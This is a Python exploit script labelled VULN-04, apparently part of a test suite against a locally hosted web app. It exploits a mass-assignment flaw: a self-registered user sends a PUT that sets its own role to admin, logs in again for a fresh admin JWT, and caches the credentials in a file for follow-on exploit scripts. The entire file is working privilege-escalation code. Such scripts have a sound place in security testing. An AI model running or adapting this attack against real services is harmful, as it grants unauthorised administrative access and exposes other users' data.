#!/usr/bin/env python3
"""
mass_assignment.py — VULN-04: Mass Assignment / Privilege Escalation

updateUser accepts a `role` field in the request body with no restriction
on who can set it, and no allow-list of updatable fields. This means any
authenticated user — including a freshly self-registered, ordinary
account — can escalate their own privileges to admin with a single
PUT request.

Attack chain:
  1. Get a session for an ordinary, low-privilege account (self-registered
     via attacker_session.py — no special knowledge required).
  2. PUT /api/users/<own id>  { "role": "admin" }
  3. Re-login to obtain a FRESH JWT — the old token still carries the old
     role in its payload, so a new token is needed to actually exercise
     the elevated privileges.
  4. Confirm the new token's role claim is "admin".

The resulting admin session is cached to escalated_admin_account.json so
later scripts (data_exposure.py, exploit_idor.py) can use it directly.

Usage:
    python mass_assignment.py
"""

import base64
import json
import os
import sys

import requests

from attacker_session import get_attacker_session

DEFAULT_BASE_URL = "http://localhost:5001"
UPDATE_USER_PATH = "/api/users"
LOGIN_PATH = "/api/auth/login"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ESCALATED_ACCOUNT_FILE = os.path.join(SCRIPT_DIR, "escalated_admin_account.json")


def decode_jwt_payload(token: str) -> dict:
    """Decodes a JWT payload WITHOUT verifying the signature — fine here
    since we already hold the token legitimately and just want to read
    the role claim for demonstration purposes."""
    try:
        payload_b64 = token.split(".")[1]
        padding = "=" * (-len(payload_b64) % 4)
        payload_json = base64.urlsafe_b64decode(payload_b64 + padding)
        return json.loads(payload_json)
    except Exception:
        return {}


def escalate_to_admin(base_url: str = DEFAULT_BASE_URL, verbose: bool = True) -> dict:
    session = get_attacker_session(base_url=base_url, verbose=verbose)
    email, password, token = session["email"], session["password"], session["token"]

    user_id = session.get("user_id")
    if not user_id:
        # fall back to decoding it from the token if attacker_session
        # didn't capture it (e.g. came from a cracked-creds entry)
        claims = decode_jwt_payload(token)
        user_id = claims.get("id") or claims.get("_id") or claims.get("userId")
    if not user_id:
        raise RuntimeError("Could not determine attacker's own user id — "
                            "cannot target the PUT request.")

    before_role = decode_jwt_payload(token).get("role", "unknown")
    if verbose:
        print(f"[*] Attacker account: {email}")
        print(f"[*] Current token role claim: {before_role}")
        print(f"[*] Target: PUT {base_url}{UPDATE_USER_PATH}/{user_id}")

    resp = requests.put(
        f"{base_url.rstrip('/')}{UPDATE_USER_PATH}/{user_id}",
        json={"role": "admin"},
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )

    if verbose:
        print(f"[*] PUT response: HTTP {resp.status_code}")
        print(f"    {resp.text[:300]}")

    if resp.status_code not in (200, 201):
        raise RuntimeError(f"Mass assignment PUT failed: HTTP {resp.status_code} — {resp.text}")

    # The DB role is updated now, but the OLD token still claims the old
    # role — re-login to get a fresh token that actually reflects it.
    if verbose:
        print("[*] Re-logging in to obtain a fresh token with updated role claim...")

    login_resp = requests.post(
        f"{base_url.rstrip('/')}{LOGIN_PATH}",
        json={"email": email, "password": password},
        timeout=10,
    )
    if login_resp.status_code != 200:
        raise RuntimeError(f"Re-login failed: HTTP {login_resp.status_code} — {login_resp.text}")

    new_body = login_resp.json()
    new_token = new_body.get("accessToken") or new_body.get("token")
    after_role = decode_jwt_payload(new_token).get("role", "unknown")

    if verbose:
        print(f"[*] New token role claim: {after_role}")
        if after_role == "admin":
            print("[+] PRIVILEGE ESCALATION CONFIRMED: ordinary self-registered "
                  "account is now admin")
        else:
            print("[!] Role claim did not change — check the PUT body/field name "
                  "against your actual updateUser implementation")

    admin_session = {
        "email": email,
        "password": password,
        "token": new_token,
        "user_id": user_id,
        "role": after_role,
        "source": "mass_assignment_escalation",
    }

    with open(ESCALATED_ACCOUNT_FILE, "w") as f:
        json.dump(admin_session, f, indent=2)
    if verbose:
        print(f"[*] Cached escalated admin session to {ESCALATED_ACCOUNT_FILE}")

    return admin_session


if __name__ == "__main__":
    try:
        escalate_to_admin()
    except Exception as e:
        print(f"[!] Exploit failed: {e}", file=sys.stderr)
        sys.exit(1)